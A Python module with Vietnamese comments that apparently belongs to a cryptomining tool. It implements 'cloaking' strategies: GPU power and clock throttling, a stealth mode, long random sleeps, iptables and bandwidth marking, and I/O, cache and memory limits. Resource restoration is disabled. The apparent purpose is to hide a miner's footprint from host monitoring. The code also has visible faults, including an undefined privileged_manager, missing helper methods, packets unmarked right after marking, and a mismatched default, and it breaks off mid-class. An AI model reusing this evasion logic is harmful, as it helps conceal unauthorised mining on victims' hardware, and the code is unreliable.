"""
Module cloak_strategies.py - Các chiến lược cloaking cho tiến trình khai thác (đồng bộ).
CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng restoration - chỉ cloaking.
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
# ABC removed - no longer needed after removing CloakStrategy base class
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
from pathlib import Path

from .utils import MiningProcess, StrategyType

# ✅ UNIFIED LOGGING: Use centralized logging system
from .module_loggers import get_gpu_cloaking_logger

# ✅ ERROR MANAGEMENT: Use centralized error handling system
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
cloak_logger = get_gpu_cloaking_logger()

# ✅ ERROR REPORTER: Get centralized error reporter instance
error_reporter = get_error_reporter()

# **GPU-Only Mode**: CPU ResourceManager removed for GPU-only operations
if TYPE_CHECKING:
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                         SIMPLIFIED CLOAK COORDINATOR                        #
###############################################################################

from .utils import CloakRequest, CloakResult
from .resource_control import HardwareController

class CloakCoordinator:
    """
    Simple coordinator - no complex factory or abstract strategies.
    Pipeline Stage 2: Nhận CloakRequest từ ResourceManager -> Chọn strategy -> Gọi HardwareController.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize CloakCoordinator với config.
        
        :param config: Configuration dictionary
        """
        self.config = config
        self.logger = cloak_logger  # Use existing logger
        
        # Initialize hardware controller for Stage 3
        self.hw_controller = HardwareController(config)
        
        self.logger.info("[CS] CloakCoordinator initialized - Stage 2 ready")
    
    def process_request(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Strategy Coordinator** (điều phối chiến lược)
        
        Trách nhiệm chính của Stage 2:
        1. Quyết định strategy dựa trên config
        2. Chuẩn bị params cho strategy đó
        3. Forward đến hardware controller
        
        :param request: CloakRequest từ ResourceManager (chỉ có PID & metadata)
        :return: CloakResult từ HardwareController
        """
        try:
            # Stage 2 decides strategy (not Stage 1!)
            strategy = request.strategy_name
            if not strategy:
                # Auto-select strategy based on config
                strategy = getattr(self.config, 'default_strategy', 'gpu')
                self.logger.info(f"[CS] Auto-selected strategy '{strategy}' from config")
            
            self.logger.info(f"[CS] Stage 2: Processing PID {request.pid} with strategy '{strategy}'")
            
            # Stage 2 prepares params based on strategy
            if strategy == 'gpu':
                # Prepare GPU params from config
                request.params = {
                    'gpu_index': 0,
                    'power_limit': getattr(self.config, 'gpu_power_limit', 150),
                    'memory_clock': getattr(self.config, 'gpu_memory_clock', 810),
                    'sm_clock': getattr(self.config, 'gpu_sm_clock', 1200),
                    'temp_threshold': getattr(self.config, 'gpu_temp_threshold', 75)
                }
                return self._apply_gpu_strategy(request)
                
            elif strategy == 'network':
                # Prepare network params from config
                request.params = {
                    'bandwidth_limit': getattr(self.config, 'network_bandwidth_limit', 100),
                    'interface': getattr(self.config, 'network_interface', 'eth0')
                }
                return self._apply_network_strategy(request)
                
            elif strategy == 'disk_io':
                # Prepare disk I/O params (placeholder for now)
                request.params = {}
                return self._apply_disk_io_strategy(request)
                
            elif strategy == 'cache':
                # Prepare cache params (placeholder)
                request.params = {}
                return self._apply_cache_strategy(request)
                
            elif strategy == 'memory':
                # Prepare memory params (placeholder)
                request.params = {}
                return self._apply_memory_strategy(request)
                
            else:
                self.logger.error(f"[CS] Unknown strategy: {strategy}")
                return CloakResult(
                    success=False,
                    pid=request.pid,
                    error_msg=f"Unknown strategy: {strategy}"
                )
                
        except Exception as e:
            self.logger.error(f"[CS] Exception in process_request: {e}")
            return CloakResult(
                success=False,
                pid=request.pid,
                error_msg=str(e)
            )
    
    def _apply_gpu_strategy(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Route GPU strategy** (điều phối chiến lược GPU)
        
        CHỈ forward params từ request, KHÔNG duplicate defaults!
        Stage 1 đã prepare params, Stage 2 chỉ route.
        
        :param request: CloakRequest với GPU params đã được prepare ở Stage 1
        :return: CloakResult từ HardwareController
        """
        self.logger.info(f"[CS] Routing GPU strategy for PID {request.pid}")
        
        # Stage 3: Direct forward to hardware controller
        # KHÔNG prepare lại params - dùng trực tiếp từ request!
        control_params = {
            'pid': request.pid,
            **request.params  # Forward ALL params as-is from Stage 1
        }
        
        result = self.hw_controller.apply_gpu_controls(control_params)
        
        if result.success:
            self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
        else:
            self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")
            
        return result
    
    def _apply_network_strategy(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Route Network strategy** (điều phối chiến lược mạng)
        
        CHỈ forward params, KHÔNG duplicate defaults!
        
        :param request: CloakRequest với network params từ Stage 1
        :return: CloakResult
        """
        self.logger.info(f"[CS] Routing network strategy for PID {request.pid}")
        
        # Direct forward params từ Stage 1, không prepare lại
        control_params = {
            'pid': request.pid,
            **request.params  # Forward ALL network params as-is
        }
        
        # Forward to hardware controller
        result = self.hw_controller.apply_network_controls(control_params)
        
        if result.success:
            self.logger.info(f"[CS] ✅ Network strategy routed successfully for PID {request.pid}")
            
        return result
    
    def _apply_disk_io_strategy(self, request: CloakRequest) -> CloakResult:
        """
        Apply disk I/O throttling - simplified placeholder.
        
        :param request: CloakRequest
        :return: CloakResult
        """
        self.logger.info(f"[CS] Disk I/O strategy for PID {request.pid} - placeholder")
        
        # Placeholder - có thể implement sau nếu cần
        return CloakResult(
            success=True,
            pid=request.pid,
            applied_controls=['disk_io_throttle']
        )
    
    def _apply_cache_strategy(self, request: CloakRequest) -> CloakResult:
        """
        Apply cache management - simplified placeholder.
        
        :param request: CloakRequest
        :return: CloakResult
        """
        self.logger.info(f"[CS] Cache strategy for PID {request.pid} - placeholder")
        
        # Placeholder
        return CloakResult(
            success=True,
            pid=request.pid,
            applied_controls=['cache_management']
        )
    
    def _apply_memory_strategy(self, request: CloakRequest) -> CloakResult:
        """
        Apply memory limits - simplified placeholder.
        
        :param request: CloakRequest
        :return: CloakResult  
        """
        self.logger.info(f"[CS] Memory strategy for PID {request.pid} - placeholder")
        
        # Placeholder
        return CloakResult(
            success=True,
            pid=request.pid,
            applied_controls=['memory_limit']
        )


###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################

class GpuCloakStrategy:
    """
    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
      - Giới hạn power limit,
      - Set xung nhịp,
      - Integrated thermal monitoring và protection
      - Advanced thermal throttling với emergency protection
    
    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
    """
    
    strategy_type = StrategyType.GPU
    
    # ✅ UNIFIED: Comprehensive cloaking attributes
    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
    coordination_priority = 100  # Highest priority for GPU processes
    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
    requires_plugin_system = True  # GPU strategies require plugin system

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager
    ):
        """
        ✅ ENHANCED: Robust constructor với comprehensive validation và multi-level fallback.

        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU.
        """
        self.logger = logger
        self.config = config

        # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
        self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
            gpu_resource_manager, config, logger
        )
        
        # ✅ CRITICAL VALIDATION: Ensure we have a working GPU manager
        if not self._validate_gpu_manager_functionality():
            error_msg = "GPU cloaking strategy cannot operate without functional GPU manager"
            self.logger.error(f"💀 [CONSTRUCTOR] {error_msg}")
            raise RuntimeError(error_msg)

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring

        # Tên tiến trình GPU trong config
        self.allowed_process_name = config.get("processes", {}).get("GPU", "")
        if not self.allowed_process_name:
            self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")

        # ✅ UNIFIED: GPU Performance Control với Stealth Mode Support
        # Check for stealth_mode configuration first
        self.stealth_mode = config.get('stealth_mode', False)
        if self.stealth_mode:
            # Apply stealth_mode profile: power_limit=80% → throttle_percentage=20%
            self.throttle_percentage = 20  # 80% power → 20% reduction
            self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
        else:
            self.throttle_percentage = config.get('throttle_percentage', 20)
            
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
            self.throttle_percentage = 20

        self.target_sm_clock = config.get('sm_clock', 1240)
        
        # ✅ UNIFIED: Integrated Thermal Management Configuration
        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
        self.aggressive_cooling = config.get('aggressive_cooling', False)
        
        # ✅ UNIFIED: Thermal monitoring enables
        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
        self.target_mem_clock = config.get('mem_clock', 877)
        
        # ✅ SMART CLOAKING: Conditional logic parameters
        self.adaptive_throttling = config.get('adaptive_throttling', True)
        self.smart_power_scaling = config.get('smart_power_scaling', True)
        self.emergency_fallback = config.get('emergency_fallback', True)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80

    def _limit_temperature_and_random_sleep(self, pid: int, gpu_count: int) -> None:
        """
        Hàm nội bộ để:
          - Giới hạn nhiệt độ cho mỗi GPU (nếu cần)
          - Ngủ một khoảng thời gian ngẫu nhiên (chỉ gọi 1 lần).
        """
        # --- Giới hạn nhiệt độ ---
        for gpu_index in range(gpu_count):
            if self.stop_monitoring:
                self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
                break

            success_temp = self.gpu_resource_manager.limit_temperature(
                gpu_index=gpu_index,
                temperature_threshold=self.temperature_threshold,
                fan_speed_increase=0  # Không tăng tốc độ quạt
            )
            if success_temp:
                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
            else:
                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")

        # --- Ngủ ngẫu nhiên ---
        INTERVAL_CHOICES = [
            (300, 600),    # 5 - 10 phút
            (600, 1200),   # 10 - 20 phút
            (1200, 1800),  # 20 - 30 phút
            (1800, 3600),  # 30 - 60 phút
            (3600, 7200),  # 60 - 120 phút
        ]
        chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
        random_sleep_sec = random.randint(*chosen_range)

        self.logger.debug(
            f"[GPU Cloaking] Ngủ {random_sleep_sec} giây (được chọn từ {chosen_range}) sau khi limit nhiệt độ."
        )
        time.sleep(random_sleep_sec)
    
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
        
        :param process: Enhanced MiningProcess với classification metadata.
        :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            # ✅ ENHANCED SAFETY CHECK: Comprehensive GPU manager validation
            if not self._validate_gpu_manager_runtime():
                self.logger.error("💀 [SAFETY CHECK] GPU resource manager not ready – aborting gpu_cloaking apply")
                self._log_gpu_manager_diagnostics()
                return False

            pid, name = process.pid, process.name

            self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")

            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
            if self.allowed_process_name and name != self.allowed_process_name:
                self.logger.debug(
                    f"[GPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên GPU trong config."
                )
                return True  # ✅ SUCCESS: Skipped by design, not an error

            gpu_count = self.gpu_resource_manager.get_gpu_count()
            if gpu_count == 0:
                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
                return True  # ✅ SUCCESS: Skipped due to no GPUs (not an error)

            # Giới hạn power + set clocks cho mỗi GPU
            for gpu_index in range(gpu_count):
                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                if current_pl is None:
                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
                    continue

                # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
                if current_pl <= 100:
                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
                    continue
                
                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                
                # Sử dụng privileged_manager nếu có cho GPU clock control
                if self.privileged_manager:
                    clock_success = self.privileged_manager.set_gpu_clock_limits(
                        gpu_id=gpu_index,
                        sm_clock=self.target_sm_clock,
                        mem_clock=self.target_mem_clock
                    )
                    if clock_success:
                        self.logger.info(f"🔐 [GPU Cloaking] Set clocks via privileged_manager for GPU={gpu_index}")
                
                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                if ok_pl:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")

            # ✅ UNIFIED: Integrated thermal management (không cần separate thread)
            if self.enable_thermal_monitoring:
                self._apply_integrated_thermal_management(pid, gpu_count)
            
            # ✅ ENHANCED: Activate GPU plugins for advanced cloaking features
            plugin_success = self._activate_gpu_plugins(pid)
            if plugin_success:
                self.logger.info(f"🎮 [GPU PLUGINS] Enhanced cloaking features activated for PID={pid}")
            else:
                self.logger.warning(f"⚠️ [GPU PLUGINS] Running with basic cloaking only for PID={pid}")
            
            self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
            self.logger.info(f"   • Basic GPU controls: ✅ Applied")
            self.logger.info(f"   • Plugin enhancements: {'✅ Active' if plugin_success else '⚠️ Inactive'}")
            
            return True  # ✅ SUCCESS: GPU cloaking completed successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"GPU Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: GPU cloaking failed
            
    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[GPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            NETWORK STRATEGY: NetworkCloakStrategy                           #
###############################################################################

class NetworkCloakStrategy:
    """
    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc).
    
    Enhanced cho comprehensive cloaking với network isolation.
    """
    
    strategy_type = StrategyType.NETWORK
    requires_plugin_system = False  # Network strategies execute directly
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = False  # Network is SECONDARY strategy
    coordination_priority = 70  # Medium-high priority
    resource_conflicts = []  # No direct conflicts with other strategies
    depends_on_strategies = []  # Independent of other strategies
    supports_concurrent_application = True  # Safe to apply with any other strategy
    estimated_application_time_ms = 200  # iptables + tc commands ~200ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: NetworkResourceManager
    ):
        """
        Khởi tạo NetworkCloakStrategy.

        :param config: Cấu hình cloaking Network (dict).
        :param logger: Logger.
        :param network_resource_manager: ResourceManager liên quan đến Network.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = cast(Any, network_resource_manager)

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
            self.bandwidth_reduction_mbps = 700

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
        
        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Dùng pid để tạo mark

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot mark packets

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface, mark, self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return False  # ✅ FAILURE: Cannot limit bandwidth

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")

            # Rollback mark_packets
            self.network_resource_manager.unmark_packets(pid, mark)
            return True  # ✅ SUCCESS: Network cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Net Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Network cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy:
    """
    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.DISK_IO
    requires_plugin_system = False  # Disk I/O strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: DiskIOResourceManager
    ):
        """
        Khởi tạo DiskIoCloakStrategy.

        :param config: Cấu hình cloaking Disk IO (dict).
        :param logger: Logger.
        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)

        self.io_weight = config.get('io_weight', 3)
        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
            self.io_weight = 3

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set I/O weight
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Disk I/O cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy:
    """
    Cloaking Cache (đồng bộ):
      - Drop caches,
      - Giới hạn cache usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.CACHE
    requires_plugin_system = False  # Cache strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo CacheCloakStrategy.

        :param config: Cấu hình cloaking Cache (dict).
        :param logger: Logger.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
            if ok:
                self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
                return True  # ✅ SUCCESS: Cache cloaking applied successfully
            else:
                self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set cache limit
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Cache Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Cache cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy                             #
###############################################################################
class MemoryCloakStrategy:
    """
    Cloaking Memory (đồng bộ):
      - Giới hạn Memory usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.MEMORY
    requires_plugin_system = False  # Memory strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: MemoryResourceManager,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking Memory (dict).
        :param logger: Logger.
        :param memory_resource_manager: ResourceManager liên quan đến Memory.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = cast(Any, memory_resource_manager)
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        # ✅ SMART MEMORY: GPU-aware memory allocation
        self.gpu_aware = config.get('gpu_aware', True)
        self.smart_mode = config.get('smart_mode', True)
        
        # Dynamic memory based on process type
        base_memory = config.get('memory_limit_mb', 6144)
